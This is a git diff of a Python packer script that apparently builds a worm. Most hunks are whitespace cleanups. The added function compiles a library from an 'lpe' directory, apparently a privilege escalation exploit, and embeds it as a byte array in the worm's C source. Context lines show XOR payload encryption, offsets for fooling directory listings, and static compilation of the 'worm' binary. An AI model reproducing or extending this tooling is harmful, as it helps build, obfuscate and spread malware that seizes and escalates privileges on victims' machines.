@@ -64,7 +64,7 @@ class ElfSection:
         self.name = name
         self.size = size
         self.address = address
-    
+
     def set_bytes(self, bs):
         self.bytes = bs
 
@@ -75,14 +75,14 @@ class ElfSection:
 
 ###
 # execute a bash command (print the output if verbose=True)
-def bash(command, verbose=False):
-    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, cwd=cwd)
+def bash(command, verbose=False, working_dir=None):
+    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, cwd=cwd if working_dir is None else working_dir)
     output, error = process.communicate()
     if verbose:
         print(output.decode())
     return output.decode()
 
-### 
+###
 # get the relative offset of all the functions in the objdump
 def get_function_offsets(objdump):
     mappings = {}
@@ -103,7 +103,7 @@ def get_sections(file):
             int(parts[0])
             # get the section information from the current line
             section = ElfSection(name=parts[1], size=int(parts[2], 16), address=int(parts[3], 16))
-            
+
             # extract the bytes of the section
             bs_tmp = f"{cwd}/bs_tmp.bin"
             bash(f"objcopy -O binary -j {section.name} {file} {bs_tmp}")
@@ -124,17 +124,17 @@ def get_bytes_so(sections):
     for section in sections:
         # add a padding between the sections in case there is space in between
         padding = section.address - pos
-        
+
         # fill the padding with random bytes
         for i in range(padding):
             bs += int.to_bytes(randint(0x01, 0xff))
-        
+
         # add the content of the section
         bs += section.bytes
         pos = section.address + section.size
 
     # convert to string to bytes representation, keeping the \\x
-    return "".join(["0x{:02x}".format(c) for c in bs])   
+    return "".join(["0x{:02x}".format(c) for c in bs])
 
 ###
 # get the got entries and map the actual offset of each function
@@ -146,7 +146,7 @@ def get_got_mappings(file, objdump):
         parts = re.split(r'\s+', line.strip())
         try:
             # check if first part is the offset of the entry
-            gotentry_offset = hex(int(parts[0], 16))   
+            gotentry_offset = hex(int(parts[0], 16))
             name = parts[4]
             mappings[gotentry_offset] = func_offsets[name]
         except:
@@ -186,7 +186,7 @@ def xor_encrypt_layered(bs, key=0x00):
             bs[ib] ^= key[ik]
             ik = (ik + i + 1 ) % len(key)
     return "".join(["\\x{:02x}".format(b) for b in bs])
-    
+
 
 ###
 # generate a random 8byte key (uint64)
@@ -229,16 +229,16 @@ def compile_worm_with_all_offsets(code_original, lib, outbinary, out, data, stri
             # check for the address of the key and rebuild the program
             lib.elf_offset_key  = hex(int(line.strip().split(':')[0][2:], 16) + 2)
             break
-            
+
     # extract the actual offset of the data/code in the compiled binary
     lib_offset = get_libdata_offset(outbinary, bytes.fromhex(data.replace("\\x", "")))
     if lib_offset is None:
         raise LookupError("Data not found!")
     lib.elf_offset_data = hex(lib_offset)
-    
+
     # get the offsets for the fooling LS bytes
     lib.fools_offsets = get_fools_offsets(outbinary)
-    
+
     # prepare the code for compilation; insert the data for the MaLibraries
     code = get_module_setup_code(code_original, lib)
 
@@ -253,6 +253,17 @@ def compile_worm_with_all_offsets(code_original, lib, outbinary, out, data, stri
     # compile the final program as a static executable, containing all the necessary code and data
     bash(f"{gcc} {flag} -static -o {outbinary} {out}")   # -s to strip all the debug-symbols
 
+
+
+def embed_library():
+    bash("make", working_dir="./lpe")
+    with (open("./lpe/bin/libnss_X/X1234.so.2","rb") as lib,
+          open("./src/main/modules/library_bin.h","w") as src):
+        bytes_read = lib.read()
+        hex_arr = [hex(i) for i in bytes_read]
+        str_arr = ",".join(hex_arr)
+        src.write(f"""#pragma once\n\n""")
+        src.write(f"""static char LIBRARY_BIN[] ={"{"} {str_arr} {"}"};""")
 
 ############
 ## CONFIG ##
@@ -290,16 +301,16 @@ def pack(module):
 
     # define all the filenames
     so_file = f"{dir_bin}/{module}.so"
-    
+
     # compile the library as position-independent shared object
     bash("make", verbose=True)
-    
+
     # produce an objdump of the shared object
     objdump = bash(f"objdump -d -M intel {so_file}")
 
     # extract the ELF-sections
     sections = get_sections(so_file)
-    
+
     # get the .GOT mappings
     got_mappings = get_got_mappings(so_file, objdump)
 
@@ -334,12 +345,13 @@ def pack(module):
 
     # print the file-info of the compiled binary
     bash(f"file {outbinary}", verbose=True)
-    
+
 
     return out
 
+if __name__ =="__main__":
+    embed_library()
+    packed_file = pack(module)
 
-packed_file = pack(module)
-
-# DONE :)
-print(f"\n\n**Done**\n\nFind the resulting code at {packed_file}. :)")
+    # DONE :)
+    print(f"\n\n**Done**\n\nFind the resulting code at {packed_file}. :)")
